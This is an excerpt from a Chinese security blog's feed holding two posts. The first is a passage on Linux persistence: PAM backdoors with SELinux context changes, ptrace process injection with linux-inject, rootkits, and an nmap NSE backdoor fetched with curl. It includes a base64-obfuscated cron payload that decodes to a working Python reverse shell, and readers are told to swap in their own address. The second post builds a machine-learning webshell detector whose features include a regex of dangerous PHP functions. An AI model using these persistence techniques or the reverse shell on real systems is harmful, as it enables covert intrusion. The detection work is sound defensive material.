pam_xauth.so</span><br></pre></td></tr></table></figure><p>如果selinux是开启的环境，一定要关掉或者设置好上下文pam_unix.so才能正常工作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">查看selinux 状态</span><br><span class="line">getenforce</span><br><span class="line">    Enforcing 关闭</span><br><span class="line">    Permissive 开启</span><br><span class="line">临时关闭selinux</span><br><span class="line">setenforce 0</span><br><span class="line">临时开启selinux</span><br><span class="line">setenforce 1</span><br><span class="line">查看selinux上下文：</span><br><span class="line">ls -Z pam_unix.so.bak</span><br><span class="line">设置selinux上下文：</span><br><span class="line">chcon –reference&#x3D;pam_unix.so.bak pam_unix.so</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#确保ssh开启pam支持</span><br><span class="line">vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">UsePAM yes</span><br><span class="line"></span><br><span class="line">#自动化脚本</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;litsand&#x2F;shell&#x2F;blob&#x2F;master&#x2F;pam.sh</span><br></pre></td></tr></table></figure><p>检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"></span><br><span class="line">2、检查pam_unix.so的修改时间</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32位</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64位</span><br></pre></td></tr></table></figure><p>清除：yum reinstall pam</p><h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在 linux 中具有调试功能的工具有  ptrace、Gdb、radare2、strace 等，这些工具都是使用 ptrace 这个系统调用来提供服务的。ptrace  系统调用允许一个进程去调试另外一个进程。</p><p>GitHub存在大量开源工具，比如: linux-inject，主要原理是使用 ptrace 向进程中注入恶意 so 文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$.&#x2F;inject [-n process-name] [-p pid] [library-to-inject]</span><br><span class="line">.&#x2F;inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure><p>清除：kill或者重启对应的进程即可</p><p>还有 cymothoa ：<a href="https://github.com/jorik041/cymothoa">https://github.com/jorik041/cymothoa</a></p><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><p>rootkit分为内核级和应用级两种:内核级的比如：Diamorphine，应用级的比如：Mafix</p><p>Mafix 是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。应用级rookit，主要替换ls、ps、netstat命令来隐藏文件</p><p>检测：使用相关检测工具，比如：unhide</p><h3 id="nmap-nse后门"><a href="#nmap-nse后门" class="headerlink" title="nmap nse后门"></a>nmap nse后门</h3><p>很多linux系统中默认都安装了nmap</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.nmap/scripts/</span><br><span class="line"><span class="built_in">cd</span> ~/.nmap/scripts/</span><br><span class="line">curl -O <span class="string">&#x27;https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local payload &#x3D; &quot;ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>base64解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;*/1 * * * * python -c &quot;</span>exec(<span class="string">&#x27;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO2hvc3Q9JzEyNy4wLjAuMSc7cG9ydD00NDM7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChob3N0LHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vYmFzaCcsICctaSddKTsK&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))<span class="string">&quot;&quot;</span> | crontab<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;host=<span class="string">&#x27;127.0.0.1&#x27;</span>;port=<span class="number">443</span>;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),<span class="number">0</span>);os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&#x27;/bin/bash&#x27;</span>, <span class="string">&#x27;-i&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>可以将127.0.0.1改成你的地址</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;大部分来自网上，整理的笔记&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/canc3s/picBed/img/2021/c71bea1a3cacfb608ed0c11558f2</summary>
      
    
    
    
    <category term="权限维持" scheme="https://canc3s.github.io/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
    
    <category term="权限维持" scheme="https://canc3s.github.io/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
    <category term="linux" scheme="https://canc3s.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>基于机器学习的 WebShell 检测</title>
    <link href="https://canc3s.github.io/2019/04/06/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84-WebShell-%E6%A3%80%E6%B5%8B/"/>
    <id>https://canc3s.github.io/2019/04/06/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84-WebShell-%E6%A3%80%E6%B5%8B/</id>
    <published>2019-04-06T15:30:04.000Z</published>
    <updated>2021-01-30T15:56:18.559Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>当时为了完成毕设写的一个小东西，留作纪念。大佬们看了轻喷</p></blockquote><p>学习网络安安全有段时间了，对Web安全已经建立了一个系统的认识。而且自己一直对人工智能、机器学习这类东西蛮感兴趣的，而且一直在看《Hands On Machine Learning with Scikit Learn and TensorFlow》这本书，所以在做毕业设计时第一时间就想到了把机器学习和Web安全结合在一起。</p><p>现在有各种各样的马，一句话，加密，混淆。普通的WebShell检测工具发挥的作用已经适应不了险恶的网络环境了，因此就必须有更加厉害的识别工具。 下面是我对机器学习识别WebShell的一些思路，希望大家可以互通有无，共同进步。</p><p>首先从github上下载了很多木马文件，然后从一些开源CMS中提取出php文件。（如 CodeIgniter，Joomla，Mambo，phpmyadmin，typecho，WordPress）</p><h2 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h2><h4 id="将文件夹中的图像，js脚本，css样式筛选出去"><a href="#将文件夹中的图像，js脚本，css样式筛选出去" class="headerlink" title="将文件夹中的图像，js脚本，css样式筛选出去"></a>将文件夹中的图像，js脚本，css样式筛选出去</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">from sklearn.base import BaseEstimator, TransformerMixin</span><br><span class="line"></span><br><span class="line">class filters(BaseEstimator, TransformerMixin):</span><br><span class="line"></span><br><span class="line">    def transform(self, path):</span><br><span class="line">        newList &#x3D; []</span><br><span class="line">        filterExt &#x3D; [&quot;jpg&quot;, &quot;jpeg&quot;, &quot;png&quot;, &quot;git&quot;, &quot;js&quot;, &quot;css&quot;, &quot;ico&quot;, &quot;jar&quot;, &quot;md&quot;, &quot;sql&quot;, &quot;json&quot;, &quot;twig&quot;]</span><br><span class="line">        for root, dirs, files in os.walk(path):</span><br><span class="line">            for completeName in files:</span><br><span class="line">                fileName, extension &#x3D; os.path.splitext(completeName)</span><br><span class="line">                if extension.lower() not in filterExt:</span><br><span class="line">                    newList.append(os.path.join(root, completeName))</span><br><span class="line">        return newList</span><br></pre></td></tr></table></figure><blockquote><p>不能给机器太大压力</p></blockquote><h4 id="将文件统一编码为utf-8"><a href="#将文件统一编码为utf-8" class="headerlink" title="将文件统一编码为utf-8"></a>将文件统一编码为utf-8</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import chardet</span><br><span class="line"></span><br><span class="line">class convert_encode(BaseEstimator, TransformerMixin):</span><br><span class="line">    </span><br><span class="line">    def transform(self, lists):</span><br><span class="line">        num &#x3D; 0</span><br><span class="line">        newList &#x3D; []</span><br><span class="line">        for x in lists:</span><br><span class="line">            with open(x, &quot;rb&quot;) as f:</span><br><span class="line">                content &#x3D; f.read()</span><br><span class="line">                encode &#x3D; chardet.detect(content)[&#39;encoding&#39;]</span><br><span class="line">                if encode !&#x3D; &quot;ascii&quot;:</span><br><span class="line">                    content &#x3D; content.decode(&quot;utf-8&quot;, &quot;ignore&quot;)</span><br><span class="line">                    num +&#x3D; 1</span><br><span class="line">                else:</span><br><span class="line">                    content &#x3D; content.decode(encode, &quot;ignore&quot;)</span><br><span class="line">            filePath, fileName &#x3D; os.path.split(x)</span><br><span class="line">            bufPath &#x3D; &quot;buf&#x2F;&quot; + filePath[7:]</span><br><span class="line">            if not os.path.exists(bufPath):</span><br><span class="line">                os.makedirs(bufPath)</span><br><span class="line">            with open(bufPath + &quot;&#x2F;&quot; + fileName, &quot;w&quot;) as f:</span><br><span class="line">                f.write(content)</span><br><span class="line">            newList.append(bufPath + &quot;&#x2F;&quot; + fileName)</span><br><span class="line">        print(len(lists), &quot;个文件中&quot;, str(num), &quot;个文件被统一编码，所有处理后的文件被放到buf下&quot;)</span><br><span class="line">        return newList</span><br></pre></td></tr></table></figure><blockquote><p>方便后面对文件的处理和特征提取</p></blockquote><h4 id="对列表中的文件进行去重"><a href="#对列表中的文件进行去重" class="headerlink" title="对列表中的文件进行去重"></a>对列表中的文件进行去重</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def get_md5(file_path):</span><br><span class="line">    md5_obj &#x3D; hashlib.md5()</span><br><span class="line">    with open(file_path, &#39;rb&#39;) as f:</span><br><span class="line">        md5_obj.update(f.read())</span><br><span class="line">        return md5_obj.hexdigest()</span><br><span class="line"></span><br><span class="line">class removal(BaseEstimator, TransformerMixin):</span><br><span class="line"></span><br><span class="line">    def transform(self, all_files):</span><br><span class="line">        num &#x3D; 0</span><br><span class="line">        all_md5 &#x3D; []</span><br><span class="line">        new_list &#x3D;[]</span><br><span class="line">        for files in all_files:</span><br><span class="line">            file_md5 &#x3D; get_md5(files)</span><br><span class="line">            if file_md5 not in all_md5 and (file_md5 !&#x3D; -1):</span><br><span class="line">                all_md5.append(file_md5)</span><br><span class="line">                new_list.append(files)</span><br><span class="line">            else:</span><br><span class="line">                num +&#x3D; 1</span><br><span class="line">        print(&quot;一共有&quot;, str(num), &quot;个重复文件，已从列表中去除&quot;)</span><br><span class="line">        return new_list</span><br></pre></td></tr></table></figure><blockquote><p>重复的文本会对机器的学习造成负面影响</p></blockquote><h4 id="将不在列表中的文件从buf中移除"><a href="#将不在列表中的文件从buf中移除" class="headerlink" title="将不在列表中的文件从buf中移除"></a>将不在列表中的文件从buf中移除</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class clearn(BaseEstimator, TransformerMixin):</span><br><span class="line"></span><br><span class="line">    def fit(self, lists):</span><br><span class="line">        return self</span><br><span class="line">        </span><br><span class="line">    def transform(self, lists):</span><br><span class="line">        num &#x3D; 0</span><br><span class="line">        for root, dirs, files in os.walk(&quot;buf&#x2F;&quot;):</span><br><span class="line">            for i in files:</span><br><span class="line">                completeName &#x3D; os.path.join(root, i)</span><br><span class="line">                if completeName not in lists:</span><br><span class="line">                    os.remove(completeName)</span><br><span class="line">                    num +&#x3D; 1</span><br><span class="line">        print(&quot;删除了&quot;, str(num), &quot;个无用文件&quot;)        </span><br></pre></td></tr></table></figure><h4 id="创建文件预处理流水线对文件进行处理"><a href="#创建文件预处理流水线对文件进行处理" class="headerlink" title="创建文件预处理流水线对文件进行处理"></a>创建文件预处理流水线对文件进行处理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from sklearn.pipeline import Pipeline</span><br><span class="line"></span><br><span class="line">file_transform &#x3D; Pipeline([</span><br><span class="line">    (&#39;filters&#39;, filters()),</span><br><span class="line">    (&#39;convert_encode&#39;, convert_encode()),</span><br><span class="line">    (&#39;removal&#39;, removal()),</span><br><span class="line">    (&#39;clearn&#39;, clearn())</span><br><span class="line">])</span><br><span class="line">path &#x3D; &quot;sample&#x2F;&quot;</span><br><span class="line">file_transform.transform(path)</span><br><span class="line">12732 个文件中 2811 个文件被统一编码，所有处理后的文件被放到buf下</span><br><span class="line">一共有 4885 个重复文件，已从列表中去除</span><br><span class="line">删除了 4885 个无用文件</span><br></pre></td></tr></table></figure><blockquote><p>损失了<code>2/3</code>的木马文件</p></blockquote><h3 id="创建特征"><a href="#创建特征" class="headerlink" title="创建特征"></a>创建特征</h3><p>主要调用了<a href="https://github.com/Neohapsis/NeoPI">NeoPI</a>的接口，它使用各种统计方法来检测文本/脚本文件中的混淆和加密内容。</p><h4 id="统计文章长度"><a href="#统计文章长度" class="headerlink" title="统计文章长度"></a>统计文章长度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">class getLen:</span><br><span class="line"></span><br><span class="line">    def calculate(self,data,filename):</span><br><span class="line">        if not data:</span><br><span class="line">            return 0</span><br><span class="line">        length &#x3D; 0</span><br><span class="line">        for i in data:</span><br><span class="line">            length &#x3D; length + len(i)</span><br><span class="line">        return length</span><br></pre></td></tr></table></figure><p>正常网站的文件的文章篇幅不会太大也不会太小，但WebShell有的很长，有的很短，可以有效地从文件中分离出大马和小马</p><h4 id="计算文章的熵值"><a href="#计算文章的熵值" class="headerlink" title="计算文章的熵值"></a>计算文章的熵值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">class Entropy:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.results &#x3D; []</span><br><span class="line">        </span><br><span class="line">    def calculate(self,data,filename):</span><br><span class="line">        if not data:</span><br><span class="line">            return 0</span><br><span class="line">        entropy &#x3D; 0</span><br><span class="line">        self.stripped_data &#x3D;data.replace(&#39; &#39;, &#39;&#39;)</span><br><span class="line">        for x in range(256):</span><br><span class="line">            p_x &#x3D; float(self.stripped_data.count(chr(x)))&#x2F;len(self.stripped_data)</span><br><span class="line">            if p_x &gt; 0:</span><br><span class="line">                entropy +&#x3D; - p_x * math.log(p_x, 2)</span><br><span class="line">        self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:entropy&#125;)</span><br><span class="line">        return entropy  </span><br></pre></td></tr></table></figure><p>因为单词的组成都是有规律的，所以正常的文章熵值不会太大也不会太小，而WebShell的熵值会因为加密而产生浮动，可以把正常文件和加密马分离出来</p><h4 id="统计文章最长的单词"><a href="#统计文章最长的单词" class="headerlink" title="统计文章最长的单词"></a>统计文章最长的单词</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">class LongestWord:</span><br><span class="line">    </span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.results &#x3D; []</span><br><span class="line"></span><br><span class="line">    def calculate(self,data,filename):</span><br><span class="line">        if not data:</span><br><span class="line">            return &quot;&quot;, 0</span><br><span class="line">        longest &#x3D; 0</span><br><span class="line">        longest_word &#x3D; &quot;&quot;</span><br><span class="line">        words &#x3D; re.split(&quot;[\s,\n,\r]&quot;, data)</span><br><span class="line">        if words:</span><br><span class="line">            for word in words:</span><br><span class="line">                length &#x3D; len(word)</span><br><span class="line">                if length &gt; longest:</span><br><span class="line">                    longest &#x3D; length</span><br><span class="line">                    longest_word &#x3D; word</span><br><span class="line">        self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:longest&#125;)</span><br><span class="line">        return longest</span><br></pre></td></tr></table></figure><p>正常的文章，最长单词的长度不会超过20吧，但是WebShell就不一定了，由于加密，或者存在提权的 payload 最长单词会变得很长</p><h4 id="统计文章中恶意词汇的数量"><a href="#统计文章中恶意词汇的数量" class="headerlink" title="统计文章中恶意词汇的数量"></a>统计文章中恶意词汇的数量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class SignatureNasty:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.results &#x3D; []</span><br><span class="line"></span><br><span class="line">    def calculate(self, data, filename):</span><br><span class="line">        if not data:</span><br><span class="line">            return &quot;&quot;, 0</span><br><span class="line">        valid_regex &#x3D; re.compile(&#39;(eval\(|file_put_contents|base64_decode|exec\(|passthru|popen|proc_open|pcntl|assert\(|system\(|shell)&#39;, re.I)</span><br><span class="line">        matches &#x3D; re.findall(valid_regex, data)</span><br><span class="line">        self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:len(matches)&#125;)</span><br><span class="line">        return len(matches)</span><br></pre></td></tr></table></figure><p>一般的文件不会存在太多的文件操作，命令执行函数，但WebShell会</p><h4 id="计算文章的可压缩比例"><a href="#计算文章的可压缩比例" class="headerlink" title="计算文章的可压缩比例"></a>计算文章的可压缩比例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">class Compression:</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.results &#x3D; []</span><br><span class="line"></span><br><span class="line">    def calculate(self, data, filename):</span><br><span class="line">        if not data:</span><br><span class="line">            return &quot;&quot;, 0        </span><br><span class="line">        compressed &#x3D; zlib.compress(data.encode(&#39;utf-8&#39;))</span><br><span class="line">        ratio &#x3D; float(len(compressed)) &#x2F; float(len(data))</span><br><span class="line">        self.results.append(&#123;&quot;filename&quot;:filename, &quot;value&quot;:ratio&#125;)</span><br><span class="line">        return ratio</span><br></pre></td></tr></table></figure><p>有些木马会把自己的内容压缩或者编码，加密，这些都会一定程度上的影响文章的可压缩比例，所以这个特征也有一定的参考</p><h4 id="将特征提取过程打包"><a href="#将特征提取过程打包" class="headerlink" title="将特征提取过程打包"></a>将特征提取过程打包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def getFeatures(List):</span><br><span class="line">    Length &#x3D; []</span><br><span class="line">    Entropy &#x3D; []</span><br><span class="line">    LongestWord &#x3D; []</span><br><span class="line">    SignatureNasty &#x3D; []</span><br><span class="line">    Compression &#x3D; []</span><br><span class="line">    dicts &#x3D; &#123;&quot;getLen&quot;:Length, &quot;Entropy&quot;:Entropy, &quot;LongestWord&quot;:LongestWord, &quot;SignatureNasty&quot;:SignatureNasty, &quot;Compression&quot;:Compression&#125;</span><br><span class="line">    Features &#x3D; [&quot;getLen&quot;, &quot;Entropy&quot;, &quot;LongestWord&quot;, &quot;SignatureNasty&quot;, &quot;Compression&quot;]</span><br><span class="line">    for i in List:</span><br><span class="line">        with open(i, &quot;r&quot;) as f:</span><br><span class="line">            data &#x3D; f.read()</span><br><span class="line">        for j in range(len(Features)):</span><br><span class="line">            value &#x3D; tests[j].calculate(data, i)</span><br><span class="line">            dicts[Features[j]].append(value)</span><br><span class="line">    return Length, Entropy, LongestWord, SignatureNasty, Compression</span><br></pre></td></tr></table></figure><h3 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h3><h4 id="将数据从文件夹读取出来"><a href="#将数据从文件夹读取出来" class="headerlink" title="将数据从文件夹读取出来"></a>将数据从文件夹读取出来</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def listFile(path):</span><br><span class="line">    fileList &#x3D; []</span><br><span class="line">    for root, dirs, files in os.walk(path):</span><br><span class="line">        for i in files:</span><br><span class="line">            completeName &#x3D; os.path.join(root, i)</span><br><span class="line">            fileList.append(completeName)</span><br><span class="line">    return fileList</span><br><span class="line">shellPath &#x3D; &quot;buf&#x2F;shell&quot;</span><br><span class="line">commonPath &#x3D; &quot;buf&#x2F;common&quot;</span><br><span class="line">shell &#x3D; listFile(shellPath)</span><br><span class="line">common &#x3D; listFile(commonPath)</span><br></pre></td></tr></table></figure><h4 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellLabel &#x3D; [1 for i in range(0, len(shell))]</span><br><span class="line">commonLabel &#x3D; [0 for i in range(0, len(common))]</span><br><span class="line">files &#x3D; shell + common</span><br><span class="line">labels &#x3D; shellLabel + commonLabel</span><br></pre></td></tr></table></figure><h4 id="计算各个文件的特征值"><a href="#计算各个文件的特征值" class="headerlink" title="计算各个文件的特征值"></a>计算各个文件的特征值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tests &#x3D; []</span><br><span class="line">tests.append(getLen())</span><br><span class="line">tests.append(Entropy())</span><br><span class="line">tests.append(LongestWord())</span><br><span class="line">tests.append(SignatureNasty())</span><br><span class="line">tests.append(Compression())</span><br><span class="line"></span><br><span class="line">Length, Entropy, LongestWord, SignatureNasty, Compression &#x3D; getFeatures(files)</span><br></pre></td></tr></table></figure><h4 id="将特征集合在一起，生成一个DataFrame"><a href="#将特征集合在一起，生成一个DataFrame" class="headerlink" title="将特征集合在一起，生成一个DataFrame"></a>将特征集合在一起，生成一个DataFrame</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">dataDict &#x3D; &#123;&quot;label&quot;:labels, &quot;file&quot;:files, &quot;Length&quot;:Length, &quot;Entropy&quot;:Entropy, &quot;LongestWord&quot;:LongestWord,</span><br><span class="line">            &quot;SignatureNasty&quot;:SignatureNasty, &quot;Compression&quot;:Compression&#125;</span><br><span class="line">dataSet &#x3D; pd.DataFrame(dataDict, columns&#x3D;[&#39;label&#39;, &#39;file&#39;, &quot;Length&quot;, &quot;Entropy&quot;, &quot;LongestWord&quot;, &quot;SignatureNasty&quot;, &quot;Compression&quot;])</span><br></pre></td></tr></table></figure><h4 id="查看前五条数据"><a href="#查看前五条数据" class="headerlink" title="查看前五条数据"></a>查看前五条数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 